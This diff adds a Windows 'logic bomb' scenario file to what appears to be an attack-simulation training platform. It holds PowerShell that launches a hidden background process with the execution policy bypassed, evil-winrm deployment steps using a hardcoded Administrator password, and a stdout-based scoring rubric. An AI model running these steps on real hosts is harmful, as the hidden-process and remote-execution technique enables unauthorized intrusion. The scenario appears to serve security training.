@@ -1,0 +1,143 @@
+{
+  "id": "logic_bomb_simulation",
+  "name": "Windows Logic Bomb Attack Simulation",
+  "description": "教学与测试目的：通过 WinRM 远程通道在 Windows 靶机上模拟逻辑炸弹（Logic Bomb）攻击。炸弹以隐藏 PowerShell 后台进程持续运行，每秒检查 C:\\Users\\Public\\trigger_file.txt 是否存在。触发后通过 msg 命令向所有登录用户弹出全屏警告对话框，并生成引爆标记文件。完整演示逻辑炸弹的隐藏驻留、条件触发与桌面级视觉冲击效果。",
+  "category": "exploitation",
+  "difficulty": "easy",
+  "estimatedDuration": "3 min",
+  "rolesAllowed": [
+    "operator",
+    "admin"
+  ],
+  "mitrePhases": [
+    "Execution",
+    "Defense Evasion",
+    "Impact"
+  ],
+  "mitreTechniques": [
+    "T1059.001",
+    "T1489"
+  ],
+  "targetType": [
+    "windows_host",
+    "ad_domain"
+  ],
+  "win_profile": {
+    "username": "Administrator",
+    "password": "200209",
+    "winrm_port": "5985"
+  },
+  "steps": [
+    {
+      "id": "step1_prepare_bomb_scripts",
+      "name": "Prepare Logic Bomb Scripts",
+      "description": "在攻击机本地生成两个 PowerShell 脚本：炸弹部署脚本（含隐藏后台监听逻辑 + 自清理）和触发脚本。",
+      "toolId": "system-tools",
+      "argsTemplate": [
+        "-c",
+        "cat > /tmp/logic_bomb_deploy.ps1 << 'PSEOF1'\n$bombCode = @'\nwhile ($true) {\n  if (Test-Path 'C:/Users/Public/trigger_file.txt') {\n    $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'\n    \"BOOM! Logic bomb triggered at $ts\" | Out-File 'C:/Users/Public/BOMB_EXPLODED.txt' -Force\n    msg * '!!! WARNING: Logic Bomb Detonated !!!  System integrity compromised.'\n    Remove-Item 'C:/Users/Public/trigger_file.txt' -Force\n    break\n  }\n  Start-Sleep -Seconds 1\n}\n'@\nRemove-Item 'C:/Users/Public/trigger_file.txt','C:/Users/Public/BOMB_EXPLODED.txt','C:/Users/Public/logic_bomb.ps1' -Force -ErrorAction SilentlyContinue\nSet-Content -Path 'C:/Users/Public/logic_bomb.ps1' -Value $bombCode\n$proc = Start-Process powershell -ArgumentList '-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File C:/Users/Public/logic_bomb.ps1' -PassThru\nWrite-Output \"Logic bomb deployed. PID: $($proc.Id)\"\nWrite-Output \"Logic bomb running in background\"\nPSEOF1\ncat > /tmp/trigger_bomb.ps1 << 'PSEOF2'\nNew-Item -Path 'C:/Users/Public/trigger_file.txt' -ItemType File -Force | Out-Null\nWrite-Output \"Trigger file created: C:/Users/Public/trigger_file.txt\"\nWrite-Output \"Waiting for detonation...\"\nStart-Sleep -Seconds 3\nif (Test-Path 'C:/Users/Public/BOMB_EXPLODED.txt') {\n  Write-Output \"\"\n  Write-Output \"========== BOOM! LOGIC BOMB TRIGGERED ==========\"\n  Get-Content 'C:/Users/Public/BOMB_EXPLODED.txt'\n  Write-Output \"=================================================\"\n} else {\n  Write-Output \"ERROR: Bomb did not trigger. Check target.\"\n}\nPSEOF2\necho 'Scripts created: /tmp/logic_bomb_deploy.ps1, /tmp/trigger_bomb.ps1'"
+      ],
+      "score": 20,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1059.001"
+      ]
+    },
+    {
+      "id": "step2_deploy_bomb",
+      "name": "Deploy Logic Bomb to Windows Target",
+      "description": "通过 WinRM 将炸弹脚本上传至 Windows 靶机，并以隐藏后台进程启动，开始每秒监听触发条件。",
+      "toolId": "evil-winrm",
+      "argsTemplate": [
+        "-i",
+        "{{host}}",
+        "-u",
+        "{{username}}",
+        "-p",
+        "{{password}}",
+        "--port",
+        "{{winrm_port}}",
+        "-s",
+        "/tmp/logic_bomb_deploy.ps1"
+      ],
+      "score": 30,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1059.001"
+      ],
+      "payload_id": "lateral-winrm"
+    },
+    {
+      "id": "step3_trigger_bomb",
+      "name": "Trigger Logic Bomb on Target",
+      "description": "通过 WinRM 在靶机上创建触发文件，引爆逻辑炸弹——Windows 桌面弹出全屏 msg 警告对话框，同时生成引爆标记文件 C:\\Users\\Public\\BOMB_EXPLODED.txt。",
+      "toolId": "evil-winrm",
+      "argsTemplate": [
+        "-i",
+        "{{host}}",
+        "-u",
+        "{{username}}",
+        "-p",
+        "{{password}}",
+        "--port",
+        "{{winrm_port}}",
+        "-s",
+        "/tmp/trigger_bomb.ps1"
+      ],
+      "score": 50,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1489"
+      ],
+      "payload_id": "lateral-winrm"
+    }
+  ],
+  "rubric": {
+    "items": [
+      {
+        "id": "bomb_scripts_created",
+        "desc": "成功生成炸弹部署脚本和触发脚本",
+        "points": 20,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "Scripts created"
+        }
+      },
+      {
+        "id": "bomb_deployed",
+        "desc": "炸弹脚本已上传至 Windows 靶机并在后台运行",
+        "points": 30,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "Logic bomb running in background|Logic bomb deployed"
+        }
+      },
+      {
+        "id": "bomb_triggered",
+        "desc": "触发文件被检测到，逻辑炸弹成功引爆",
+        "points": 50,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "BOOM!|LOGIC BOMB TRIGGERED"
+        }
+      }
+    ]
+  },
+  "notSuitableFor": [
+    "dvwa",
+    "local_ip",
+    "web_url",
+    "domain",
+    "localhost"
+  ],
+  "baselineGroup": "windows-exploitation",
+  "expectedOutputPolicy": "expect_output",
+  "emptyOutputExplanation": "炸弹脚本远程部署到 Windows 靶机并在后台监听触发条件；需要 Windows 靶机开放 WinRM 5985 端口且具备管理员凭据",
+  "applicableTargetType": [
+    "windows_host",
+    "ad_domain"
+  ],
+  "teachingObjective": "演示逻辑炸弹（Logic Bomb）在 Windows 平台的后台隐藏运行、msg 桌面弹窗警告与条件触发防御规避（T1059.001, T1489）",
+  "target_class": "windows_ad",
+  "disableAutoInsert": true
+}
